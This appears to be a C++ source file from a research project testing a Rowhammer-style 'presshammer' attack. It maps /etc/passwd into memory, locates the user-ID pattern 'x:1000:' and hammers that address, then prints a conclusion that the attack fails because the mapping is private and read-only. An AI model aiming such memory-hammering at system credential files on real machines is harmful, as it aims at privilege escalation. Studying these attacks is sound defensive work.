#include "content.h"


int openCriticalFile(const char *filePath){
    int fd = open(filePath, O_RDONLY);
    if(fd == -1){
        showErrorInfo("Error opening file: " + std::string(filePath));
        perror("open");
        close(fd);
        exit(EXIT_FAILURE);
    }

    return fd;
}


void checkContentFile(bool isDoubleSided){
    showInfo("CHECK CONTENT FILE");

    // ========================================================================
    // STEP 1. Open the critical file (e.g., /etc/passwd)
    // ========================================================================
    showStep(1, "Open the critical file");

    const char* filePath = "/etc/passwd";
    int fd = openCriticalFile(filePath);
    showSuccessInfo("File: " + std::string(filePath) + " opened in read-only mode because we do not have write permissions from userland");

    struct stat sb;
    if(fstat(fd, &sb) == -1){
        showErrorInfo("Error getting file size: " + std::string(filePath));
        perror("fstat");
        close(fd);
        exit(EXIT_FAILURE);
    }


    // ========================================================================
    // STEP 2. Map the file into memory
    // ========================================================================
    showStep(2, "Map the file into memory");

    // Map the file into memory in read-only and private mode (does not share changes with disk) but permissions.
    // MAP_PRIVATE ensures the mapping is not shared and is only local to this process.
    // This means any changes made to memory will not affect the actual file on disk 
    auto mappedTarget = (void*) mmap(nullptr, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mappedTarget == MAP_FAILED){
        showErrorInfo("mmap failed");
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    volatile char *fileTargetAddress = (volatile char*) mappedTarget;
    uintptr_t fileTarget = (uintptr_t) fileTargetAddress;

    showSuccessAddress("/etc/passwd mapped in memory in read-only and private mode but permissions: ", fileTarget);

    char *content = (char *) mappedTarget;
    showContentInfo(content);

    

    // ========================================================================
    // STEP 3. Look for a specific pattern in the content (e.g., a user ID string)
    // ========================================================================
    showStep(3, "Look for a specific pattern in the content");

    const char *stringUid = "x:1000:";
    char *uidFound = std::strstr(content, stringUid);
    if(!uidFound){
        showErrorInfo("Pattern not found");
        exit(EXIT_FAILURE);
    }

    ptrdiff_t offset = uidFound - content;
    volatile char *uidTargetAddress = (volatile char*) uidFound;
    uintptr_t uidTarget = (uintptr_t) uidTargetAddress;
    
    showSuccessInfo("Pattern " + std::string(stringUid) + " found at: " + std::to_string(offset));
    showCriticalAddress("Pattern memory address (target): ", uidTarget);
    

    // ========================================================================
    // STEP 4. Check if can apply presshammer
    // ========================================================================
    showStep(4, "Check if can apply presshammer");

    if(isDoubleSided){
        doubleSidedPresshammer(uidTarget);
    }else{
        singleSidedPresshammer(uidTarget);
    }
    showSuccessAddress("Hammered target address: ", uidTarget);

    close(fd);

    

    // ========================================================================
    // CONCLUSION
    // ========================================================================
    showConclusion();
    std::cout << "The key limitation in this scenario is the memory mapping mode (MAP_PRIVATE): \n"
    << "- With MAP_PRIVATE, any changes made in memory will not be reflected back to the disk. \n"
    << "- Even if bit flips or memory corruption occurs due to presshammer, these changes will only affect the memory space and not the actual file content on the disk. \n"
    << "- Since we are mapping the file in read-only mode, we cannot make any changes to the original file content. \n" << std::endl;
    
    std::cout << "To make permanent changes to the file, we would need: \n"
    << "1. To map the file with write permissions (e.g., using MAP_SHARED | critical files requires root). \n"
    << "2. To synchronize changes with the disk (using msync() or fsync()). \n" << std::endl;

    std::cout << "Therefore, applying presshammer in this case only has a local effect on the memory of the process and cannot modify the actual file on disk. \n"
    << "The attack is not feasible as the changes won't persist outside of memory, as we lack the necessary privileges to write, the attack remains unfeasible. Not make sanse apply this attack to these cases." << std::endl;
    

}